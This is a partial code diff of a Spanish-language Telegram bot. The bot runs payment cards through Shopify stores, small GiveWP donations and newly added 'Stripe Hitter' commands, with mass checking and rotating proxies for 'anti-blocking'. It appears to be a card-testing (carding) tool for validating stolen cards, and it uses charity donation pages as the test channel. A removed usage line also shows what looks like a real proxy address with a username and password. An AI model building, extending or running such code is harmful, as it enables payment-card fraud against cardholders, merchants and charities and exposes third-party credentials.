     status_escaped = escape_markdown(result.status.value.upper())
     confidence_escaped = escape_markdown(result.confidence.value)
     
-    proxy_info = f"🔄 Proxy usado: {result.job.proxy}" if result.job.proxy else "🔄 Conexión directa"
-    
     response = (
         f"{emoji} *DONACIÓN COMPLETADA*\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"🏥 Hospital: Sydney Children's Hospital\n"
         f"💰 Monto: ${amount:.2f}\n"
         f"📊 Estado: {status_escaped}\n"
         f"{confidence_icon} Confianza: {confidence_escaped}\n"
         f"📝 Razón: {reason_escaped}\n"
-        f"⏱️ Tiempo: {result.response_time:.1f}s\n"
-        f"{proxy_info}\n\n"
+        f"⏱️ Tiempo: {result.response_time:.1f}s\n\n"
         f"💳 Tarjeta: {card_data['bin']}xxxxxx{card_data['last4']}"
     )
-    
-    if result.price != "N/A":
-        price_escaped = escape_markdown(result.price)
-        response += f"\n💰 Precio detectado: {price_escaped}"
     
     try:
         await msg.edit_text(response, parse_mode="Markdown")
     except Exception as e:
-        logger.error(f"Error en Markdown: {e}")
-        # Si falla Markdown, enviar sin formato
         await msg.edit_text(response.replace('*', '').replace('_', ''))
 
-# ================== FUNCIONES ATAJO DONATE ==================
 async def donate5(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Atajo para donación de $5"""
     context.args = ["5"]
     await donate(update, context)
 
 async def donate10(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Atajo para donación de $10"""
     context.args = ["10"]
     await donate(update, context)
 
 async def donate20(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Atajo para donación de $20"""
     context.args = ["20"]
     await donate(update, context)
 
@@ -2145,6 +2477,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_mass_menu(update, context)
     elif data == "menu_donate":
         await show_donate_menu(update, context)
+    elif data == "menu_stripe":
+        await show_stripe_menu(update, context)
     elif data == "menu_analyzer":
         await show_analyzer_menu(update, context)
     elif data == "menu_sites":
@@ -2176,7 +2510,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Mass check en progreso")
         return
     
-    # Verificar si es tarjeta para Shopify
     card_data = CardValidator.parse_card(text)
     if card_data:
         user_data = await user_manager.get_user_data(user_id)
@@ -2222,7 +2555,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await msg.edit_text(response, parse_mode="Markdown")
         except Exception as e:
-            logger.error(f"Error en Markdown: {e}")
             await msg.edit_text(response.replace('*', '').replace('_', ''))
     else:
         await update.message.reply_text(
@@ -2232,7 +2564,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
 
-# ================== MANEJO DE ARCHIVOS (DETECCIÓN INTELIGENTE) ==================
+# ================== MANEJO DE ARCHIVOS ==================
 async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     document = update.message.document
@@ -2297,7 +2629,6 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             cards=user_data["cards"]
         )
     
-    # Preparar mensaje de resumen
     parts = []
     if sites:
         parts.append(f"✅ {len(sites)} sitio(s) añadido(s)")
@@ -2333,15 +2664,13 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("No hay mass check activo.")
 
-# ================== COMANDO PARA AGREGAR PROXY ==================
+# ================== COMANDOS DE PROXIES ==================
 async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Agrega un proxy manualmente"""
     user_id = update.effective_user.id
     
     if not context.args:
         await update.message.reply_text(
-            "❌ Uso: /addproxy ip:puerto o ip:puerto:user:pass\n"
-            "Ejemplo: /addproxy 23.26.53.37:6003:ywdcxpbz:rumq51bx8tk3"
+            "❌ Uso: /addproxy ip:puerto o ip:puerto:user:pass"
         )
         return
     
@@ -2356,13 +2685,10 @@ async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data["proxies"].append(normalized)
     await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
     
-    # Mostrar versión corta del proxy
     display = normalized.split(':')[0] + ':' + normalized.split(':')[1]
     await update.message.reply_text(f"✅ Proxy añadido: {display}")
 
-# ================== COMANDO PARA LISTAR PROXIES ==================
 async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Lista los proxies guardados"""
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
     proxies = user_data["proxies"]
@@ -2378,9 +2704,7 @@ async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
-# ================== COMANDO PARA LIMPIAR PROXIES MUERTOS ==================
 async def clean_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Limpia proxies muertos"""
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
     proxies = user_data["proxies"]
@@ -2421,15 +2745,17 @@ async def post_init(application: Application):
     user_manager = UserManager(db)
     card_service = CardCheckService(db, user_manager)
     
-    logger.info("✅ Bot inicializado - Shopify + GiveWP + Anti-bloqueo + Analyzer")
+    logger.info("✅ Bot inicializado - Shopify + GiveWP + Stripe Hitter")
 
 def main():
     app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
     app.post_shutdown = shutdown
 
-    # Comandos
+    # Comandos básicos
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_command))
+    
+    # Comandos de proxies
     app.add_handler(CommandHandler("addproxy", add_proxy))
     app.add_handler(CommandHandler("proxies", list_proxies))
     app.add_handler(CommandHandler("cleanproxies", clean_proxies))
@@ -2439,6 +2765,13 @@ def main():
     app.add_handler(CommandHandler("donate5", donate5))
     app.add_handler(CommandHandler("donate10", donate10))
     app.add_handler(CommandHandler("donate20", donate20))
+    
+    # Comandos Stripe
+    app.add_handler(CommandHandler("addstripe", add_stripe_url))
+    app.add_handler(CommandHandler("mystripe", list_stripe_urls))
+    app.add_handler(CommandHandler("hit", hit_stripe))
+    app.add_handler(CommandHandler("stophit", stop_hit))
+    app.add_handler(CommandHandler("stripestats", stripe_stats))
     
     # Comandos de análisis
     app.add_handler(CommandHandler("analyze", analyze_site))
@@ -2451,7 +2784,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))
 
-    logger.info("🚀 Bot iniciado - Shopify + GiveWP - Anti-bloqueo - Detección inteligente - Analyzer")
+    logger.info("🚀 Bot iniciado - Shopify + GiveWP + Stripe Hitter + Analyzer")
     app.run_polling()
 
 if __name__ == "__main__":
